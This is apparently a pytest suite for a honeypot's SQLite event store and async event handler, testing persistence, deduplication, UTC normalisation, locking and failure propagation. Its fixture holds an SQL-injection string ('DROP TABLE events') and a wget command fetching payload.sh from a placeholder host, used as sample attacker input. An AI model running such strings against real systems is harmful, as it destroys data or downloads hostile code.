import asyncio
import json
import sqlite3
from contextlib import closing
from datetime import datetime, timedelta, timezone
from pathlib import Path
from threading import Event

import pytest

from panopticon.events.event_handler import EventHandler
from panopticon.events.models import BaseEvent, Command, ConnectionClosed, ConnectionOpen, FileDownloaded, FileUploaded, LoginAttempt
from panopticon.events.sqlite_store import SQLiteEventStore


def make_event(event_type: type[BaseEvent] = Command) -> BaseEvent:
    """Creates a test event with representative event-specific and extra fields

    Args:
        event_type (type[BaseEvent]): Event model to construct

    Returns:
        BaseEvent: Event ready to be persisted
    """

    return event_type(
        session_id="test-session",
        src_ip="192.0.2.10",
        src_port=2222,
        input="echo '); DROP TABLE events; --",
        duration_seconds=1.5,
        username="admin",
        password="dummy-password",
        success=True,
        url="https://example.test/payload.sh",
        filename="payload.sh",
        filetype="text/x-shellscript",
        command="wget https://example.test/payload.sh",
        method="GET",
        extra_metadata={"sensor": "ssh"},
    )


@pytest.mark.parametrize("event_type", [ConnectionOpen, LoginAttempt, Command, ConnectionClosed, FileUploaded, FileDownloaded])
def test_events_survive_reopening(tmp_path: Path, event_type: type[BaseEvent]) -> None:
    """Checks that every event type retains its complete payload after storage is reopened

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
        event_type (type[BaseEvent]): Event model to persist
    """

    path: Path = tmp_path / "data" / "events.sqlite3"
    store: SQLiteEventStore = SQLiteEventStore(path)
    event: BaseEvent = make_event(event_type)

    store.initialise()
    store.save(event)
    SQLiteEventStore(path).initialise()

    with closing(sqlite3.connect(path)) as connection:
        row: tuple[str, str, str, str, int, str, str] = connection.execute(
            "SELECT id, timestamp, session_id, src_ip, src_port, event_type, payload FROM events"
        ).fetchone()

        assert connection.execute("PRAGMA journal_mode").fetchone()[0] == "wal"
        assert connection.execute("PRAGMA user_version").fetchone()[0] == 1

    assert row[0] == str(event.id)
    assert row[2:6] == (event.session_id, event.src_ip, event.src_port, event.event_type.value)
    assert json.loads(row[6]) == event.model_dump(mode="json")


def test_duplicate_ids_do_not_overwrite_events(tmp_path: Path) -> None:
    """Checks that replaying an event ID does not duplicate or replace its original payload

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    store: SQLiteEventStore = SQLiteEventStore(tmp_path / "events.sqlite3")
    event: BaseEvent = make_event()

    store.initialise()
    store.save(event)
    event.input = "changed"
    store.save(event)

    with closing(sqlite3.connect(store.path)) as connection:
        rows: list[tuple[str]] = connection.execute("SELECT payload FROM events").fetchall()

    assert len(rows) == 1
    assert json.loads(rows[0][0])["input"] != "changed"


def test_indexed_timestamps_are_normalised_to_utc(tmp_path: Path) -> None:
    """Checks that indexed timestamps use UTC while the original payload remains intact

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    store: SQLiteEventStore = SQLiteEventStore(tmp_path / "events.sqlite3")
    event: BaseEvent = make_event()
    event.timestamp = datetime(2026, 10, 21, 12, tzinfo=timezone(timedelta(hours=2)))

    store.initialise()
    store.save(event)

    with closing(sqlite3.connect(store.path)) as connection:
        timestamp: str = connection.execute("SELECT timestamp FROM events").fetchone()[0]

    assert timestamp == "2026-10-21T10:00:00.000000+00:00"


def test_newer_schema_is_not_modified(tmp_path: Path) -> None:
    """Checks that a newer database version is rejected before modifying the schema

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    path: Path = tmp_path / "events.sqlite3"

    with closing(sqlite3.connect(path)) as connection:
        connection.execute("PRAGMA user_version = 2")

    with pytest.raises(RuntimeError, match="schema version"):
        SQLiteEventStore(path).initialise()

    with closing(sqlite3.connect(path)) as connection:
        assert connection.execute("PRAGMA user_version").fetchone()[0] == 2
        assert connection.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall() == []


def test_locked_database_does_not_partially_insert(tmp_path: Path) -> None:
    """Checks write-lock timeout reporting and successful persistence after the lock is released

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    store: SQLiteEventStore = SQLiteEventStore(tmp_path / "events.sqlite3", timeout=0.01)
    event: BaseEvent = make_event()
    store.initialise()

    with closing(sqlite3.connect(store.path)) as connection:
        connection.execute("BEGIN IMMEDIATE")

        try:
            with pytest.raises(sqlite3.OperationalError, match="locked"):
                store.save(event)

            assert connection.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 0

        finally:
            connection.rollback()

    store.save(event)

    with closing(sqlite3.connect(store.path)) as connection:
        assert connection.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 1


@pytest.mark.asyncio
async def test_collector_drains_snapshots_and_rejects_after_close(tmp_path: Path) -> None:
    """Checks snapshot isolation, graceful draining and publication lifecycle rules

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    store: SQLiteEventStore = SQLiteEventStore(tmp_path / "events.sqlite3")
    collector: EventHandler = EventHandler(store)
    event: BaseEvent = make_event()
    original_input: str = event.input

    with pytest.raises(RuntimeError, match="not accepting"):
        collector.publish(event)

    await collector.start()
    collector.publish(event)
    event.input = "changed after publication"
    await asyncio.wait_for(collector.close(), timeout=5)
    await collector.close()

    with closing(sqlite3.connect(store.path)) as connection:
        payload: str = connection.execute("SELECT payload FROM events").fetchone()[0]

    assert json.loads(payload)["input"] == original_input

    with pytest.raises(RuntimeError, match="not accepting"):
        collector.publish(event)


class ControlledStore:
    """Test storage used to control write latency and simulate disk failures."""

    gate: Event
    failed: bool

    def __init__(self, failed: bool = False) -> None:
        """Initialises a gated storage substitute

        Args:
            failed (bool): Whether writes should raise a simulated disk error
        """

        self.gate = Event()
        self.failed = failed

    def initialise(self) -> None:
        """Accepts collector startup without creating a database"""

        return

    def save(self, event: BaseEvent) -> None:
        """Blocks until released and optionally simulates a storage failure

        Args:
            event (BaseEvent): Event supplied by the collector
        """

        if not self.gate.wait(timeout=5):
            raise TimeoutError("Test writer was not released")

        if self.failed:
            raise OSError("simulated disk failure")


@pytest.mark.asyncio
async def test_queue_capacity_and_nonblocking_writer() -> None:
    """Checks that queued writes do not block the loop and queue overflow is explicit"""

    store: ControlledStore = ControlledStore()
    collector: EventHandler = EventHandler(store, capacity=1)

    await collector.start()
    collector.publish(make_event())

    with pytest.raises(asyncio.QueueFull):
        collector.publish(make_event())

    try:
        # The event loop must still run while the storage thread is blocked.
        await asyncio.wait_for(asyncio.sleep(0.01), timeout=1)

    finally:
        store.gate.set()
        await asyncio.wait_for(collector.close(), timeout=5)


@pytest.mark.asyncio
async def test_storage_failure_propagates_without_hanging() -> None:
    """Checks that writer failures reach monitoring, flush, publication and shutdown"""

    store: ControlledStore = ControlledStore(failed=True)
    collector: EventHandler = EventHandler(store)
    store.gate.set()

    await collector.start()
    collector.publish(make_event())
    collector.publish(make_event())

    with pytest.raises(OSError, match="disk failure"):
        await asyncio.wait_for(collector.wait(), timeout=5)

    with pytest.raises(OSError, match="disk failure"):
        collector.publish(make_event())

    with pytest.raises(OSError, match="disk failure"):
        await asyncio.wait_for(collector.flush(), timeout=5)

    with pytest.raises(OSError, match="disk failure"):
        await asyncio.wait_for(collector.close(), timeout=5)


@pytest.mark.asyncio
async def test_monitor_cancellation_does_not_cancel_writer(tmp_path: Path) -> None:
    """Checks that cancelling the service monitor still allows graceful event draining

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    store: SQLiteEventStore = SQLiteEventStore(tmp_path / "events.sqlite3")
    collector: EventHandler = EventHandler(store)

    await collector.start()
    collector.publish(make_event())
    monitor: asyncio.Task[None] = asyncio.create_task(collector.wait())
    await asyncio.sleep(0)
    monitor.cancel()

    with pytest.raises(asyncio.CancelledError):
        await monitor

    await asyncio.wait_for(collector.close(), timeout=5)

    with closing(sqlite3.connect(store.path)) as connection:
        assert connection.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 1
